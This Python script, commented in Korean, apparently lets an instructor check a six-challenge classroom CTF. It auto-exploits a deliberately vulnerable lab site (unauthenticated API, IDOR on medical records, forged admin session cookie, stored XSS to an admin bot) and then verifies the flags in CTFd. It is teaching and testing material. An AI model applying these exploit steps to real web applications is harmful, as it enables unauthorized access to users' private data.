#!/usr/bin/env python3
"""
mini-CTF 자가 점검기 — "학생이 사이트에서 찾은 깃발"과 "CTFd 정답"이 같은지 끝까지 확인한다.

무엇을 하나 (3단계):
  ① 표적(MediForum)을 실제로 풀어 본다 — 6문제를 브라우저가 하는 것과 같은 순서로 자동 공략해
     화면/응답에서 깃발을 뽑아낸다.
  ② 그 값이 challenges.yml 의 정답과 글자 하나까지 같은지 비교한다.
  ③ (선택) CTFd 에 등록된 깃발을 조회하고, 실제 계정으로 **제출까지 해 본다**.
     여기까지 통과하면 "학생이 찾아 넣었는데 오답" 사고가 날 수 없다.

사용법:
  pip install requests pyyaml

  # 표적만 점검 (가장 빠름)
  python3 verify_ctf.py --victim 192.168.0.50

  # CTFd 등록 상태까지 점검
  python3 verify_ctf.py --victim 192.168.0.50 --ctfd http://192.168.0.50:8000 --token <ACCESS_TOKEN>

  # 실제 제출까지 점검 (테스트 계정 자동 생성/재사용)
  python3 verify_ctf.py --victim 192.168.0.50 --ctfd http://192.168.0.50:8000 \
      --token <ACCESS_TOKEN> --submit
"""
import argparse, re, sys, time, os
try:
    import requests, yaml
except ImportError:
    sys.exit("먼저: pip install requests pyyaml")

FLAG_RE = re.compile(r"flag\{[^}]*\}")
OK, NG, WARN = "\033[32m✓\033[0m", "\033[31m✗\033[0m", "\033[33m!\033[0m"


def first_flag(text):
    m = FLAG_RE.search(text or "")
    return m.group(0) if m else None


# =============================================================================
#  ① 표적(MediForum) 자동 공략 — 학생이 브라우저로 하는 순서 그대로
# =============================================================================
def solve_1_recon(b, s):
    """공지 글의 페이지 소스에 남은 HTML 주석."""
    home = s.get(f"{b}/", timeout=8).text
    for pid in re.findall(r"/posts/(\d+)", home):
        html = s.get(f"{b}/posts/{pid}", timeout=8).text
        f = first_flag(html)
        if f:
            return f, f"/posts/{pid} 소스 주석"
    return None, "게시글 소스에서 주석을 찾지 못함"


def solve_2_api(b, s):
    """회원 찾기 화면이 부르는 /api/users 응답에서 admin 의 api_key."""
    rows = s.get(f"{b}/api/users", timeout=8).json()
    for r in rows:
        if r.get("role") == "admin":
            return r.get("api_key"), "/api/users → role=admin 의 api_key"
    return None, "/api/users 에 admin 계정이 없음"


def solve_3_idor(b, s):
    """진료기록 상세 페이지의 번호를 1부터 올려 가며 열람(IDOR)."""
    for rid in range(1, 16):
        html = s.get(f"{b}/records/{rid}", timeout=8).text
        f = first_flag(html)
        if f:
            return f, f"/records/{rid} 처방란"
    return None, "/records/<번호> 에서 깃발을 찾지 못함"


def solve_4_dm(b, s):
    """관리자 콘솔의 '쪽지 감사'가 부르는 /api/admin/dms."""
    r = s.get(f"{b}/api/admin/dms", timeout=8)
    if r.status_code != 200:
        return None, f"/api/admin/dms 응답 {r.status_code}"
    return first_flag(r.text), "/api/admin/dms 쪽지 본문"


def solve_5_session(b, s):
    """세션 쿠키를 관리자의 이른 번호(sess-1001)로 바꿔치기."""
    r = requests.get(f"{b}/admin/secret", cookies={"MFSID": "sess-1001"}, timeout=8)
    if r.status_code != 200:
        return None, f"/admin/secret 응답 {r.status_code} (sess-1001 세션이 없을 수 있음)"
    return first_flag(r.text), "/admin/secret (MFSID=sess-1001)"


def solve_6_xss(b, s):
    """회원가입 → 글에 <script> 저장 → 신고 → 관리자 봇 검토."""
    sess = requests.Session()
    email = f"ctfcheck{int(time.time())}@user.kr"
    sess.post(f"{b}/register",
              data={"email": email, "password": "check1234", "display_name": "자가점검"}, timeout=8)
    sess.post(f"{b}/login", data={"email": email, "password": "check1234"}, timeout=8)
    if not sess.cookies.get("MFSID"):
        return None, "테스트 계정 로그인 실패"
    r = sess.post(f"{b}/posts/new",
                  data={"title": "[자가점검] 무시하세요",
                        "body": "<script>alert('verify')</script>", "tag": "general"},
                  timeout=8, allow_redirects=True)
    pid = None
    m = re.search(r"/posts/(\d+)", r.url or "")
    if m:
        pid = m.group(1)
    if pid:
        sess.post(f"{b}/posts/{pid}/report", data={"reason": "자가점검"}, timeout=8)
    html = s.get(f"{b}/admin/review", timeout=8).text
    return first_flag(html), "/admin/review 관리자 봇 검토 결과"


SOLVERS = [
    ("페이지 속 깃발 (정찰)",        solve_1_recon),
    ("인증 없는 회원 API",           solve_2_api),
    ("남의 진료기록 (IDOR)",         solve_3_idor),
    ("관리자 쪽지 도청",             solve_4_dm),
    ("예측 가능한 세션",             solve_5_session),
    ("저장형 XSS — 관리자 봇",       solve_6_xss),
]


# =============================================================================
#  ③ CTFd 점검
# =============================================================================
def ctfd_registered_flags(base, token):
    s = requests.Session()
    s.headers.update({"Authorization": f"Token {token}", "Content-Type": "application/json"})
    r = s.get(f"{base}/api/v1/challenges?view=admin", timeout=10)
    if r.status_code != 200:
        return None, f"CTFd 문제 목록 조회 실패({r.status_code})"
    out = {}
    for ch in r.json().get("data", []):
        fr = s.get(f"{base}/api/v1/challenges/{ch['id']}/flags", timeout=10)
        flags = fr.json().get("data", []) if fr.status_code == 200 else []
        out[ch["name"]] = {"id": ch["id"],
                           "flags": [f for f in flags if f.get("challenge_id") == ch["id"]]}
    return out, None


def _nonce(html, field="nonce"):
    m = re.search(r'name="%s"[^>]*value="([^"]+)"' % field, html) or \
        re.search(r'value="([^"]+)"[^>]*name="%s"' % field, html)
    return m.group(1) if m else None


def _csrf(html):
    m = re.search(r"csrfNonce['\"]?\s*[:=]\s*['\"]([a-f0-9]+)['\"]", html)
    return m.group(1) if m else None


def ctfd_submit_all(base, name, password, email, pairs):
    """테스트 계정으로 실제 제출해 'correct' 가 나오는지 확인."""
    s = requests.Session()
    reg = s.get(f"{base}/register", timeout=10)
    if "/register" in reg.url:
        s.post(f"{base}/register",
               data={"name": name, "email": email, "password": password,
                     "nonce": _nonce(reg.text)}, timeout=10)
    lp = s.get(f"{base}/login", timeout=10)
    s.post(f"{base}/login",
           data={"name": name, "password": password, "nonce": _nonce(lp.text)}, timeout=10)
    page = s.get(f"{base}/challenges", timeout=10)
    csrf = _csrf(page.text)
    if not csrf:
        return None, "테스트 계정 로그인 실패(csrfNonce 없음)"
    results = []
    for cid, cname, flag in pairs:
        r = s.post(f"{base}/api/v1/challenges/attempt",
                   json={"challenge_id": cid, "submission": flag},
                   headers={"CSRF-Token": csrf, "Content-Type": "application/json"}, timeout=15)
        status = "?"
        try:
            status = r.json().get("data", {}).get("status", "?")
        except Exception:
            pass
        results.append((cname, status))
    return results, None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--victim", required=True, help="MediForum 이 뜬 호스트/IP (예: 192.168.0.50)")
    ap.add_argument("--port", default="3003")
    ap.add_argument("--file", default=os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                                   "challenges.yml"))
    ap.add_argument("--ctfd", default="", help="CTFd 주소 (선택)")
    ap.add_argument("--token", default="", help="CTFd Access Token (선택)")
    ap.add_argument("--submit", action="store_true", help="테스트 계정으로 실제 제출까지 확인")
    a = ap.parse_args()

    base = f"http://{a.victim}:{a.port}"
    with open(a.file, encoding="utf-8") as f:
        spec = yaml.safe_load(f)
    expected = [c["flag"] for c in spec["challenges"]]
    names = [c["name"] for c in spec["challenges"]]

    print(f"표적: {base}\n정답표: {a.file}\n")
    print("── ① 표적을 실제로 풀어 본다 ────────────────────────────")
    s = requests.Session()
    found, bad = [], 0
    for i, ((label, fn), exp) in enumerate(zip(SOLVERS, expected), start=1):
        try:
            got, where = fn(base, s)
        except Exception as e:
            got, where = None, f"오류: {e}"
        found.append(got)
        if got is None:
            print(f"  {NG} {i}. {label:<24} 깃발을 못 찾음 — {where}")
            bad += 1
        elif got.strip() != exp:
            print(f"  {NG} {i}. {label:<24} 불일치")
            print(f"      사이트에서 찾은 값 : {got!r}   ({where})")
            print(f"      challenges.yml 정답: {exp!r}")
            bad += 1
        else:
            print(f"  {OK} {i}. {label:<24} {got}   ({where})")

    if a.ctfd and a.token:
        print("\n── ② CTFd 에 등록된 깃발 확인 ───────────────────────────")
        reg, err = ctfd_registered_flags(a.ctfd.rstrip('/'), a.token)
        if err:
            print(f"  {WARN} {err}")
        else:
            for nm, exp in zip(names, expected):
                info = reg.get(nm)
                if not info:
                    print(f"  {NG} '{nm}' 문제가 CTFd 에 없습니다 — import_challenges.py 를 실행하세요.")
                    bad += 1
                    continue
                if not info["flags"]:
                    print(f"  {NG} '{nm}' 에 연결된 깃발이 0개 — 무엇을 넣어도 오답 처리됩니다.")
                    bad += 1
                    continue
                contents = [f["content"] for f in info["flags"]]
                if exp in contents:
                    print(f"  {OK} '{nm}' 깃발 {len(contents)}개 등록 (정적 일치)")
                else:
                    print(f"  {WARN} '{nm}' 정적 깃발이 정답표와 다름: {contents}")
                    bad += 1

        if a.submit:
            print("\n── ③ 테스트 계정으로 실제 제출 ──────────────────────────")
            pairs = []
            for nm, got in zip(names, found):
                info = (reg or {}).get(nm)
                if info and got:
                    pairs.append((info["id"], nm, got))
            uniq = f"verifybot{int(time.time())}"
            res, err = ctfd_submit_all(a.ctfd.rstrip('/'), uniq, "Verify-Bot-2026!",
                                       f"{uniq}@verify.local", pairs)
            if err:
                print(f"  {WARN} {err}")
            else:
                for nm, status in res:
                    mark = OK if status == "correct" else NG
                    if status != "correct":
                        bad += 1
                    print(f"  {mark} '{nm}' → {status}")
                print(f"  (테스트 계정 '{uniq}' 는 리더보드에 남습니다. "
                      f"수업 전 CTFd → Admin → Users 에서 지우세요.)")

    print("\n═════════════════════════════════════════════════════")
    if bad == 0:
        print("모두 정상입니다. 학생이 찾은 깃발이 그대로 정답 처리됩니다. 🏁")
        return 0
    print(f"문제 {bad}건이 발견되었습니다. 위 로그를 보고 고친 뒤 다시 실행하세요.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
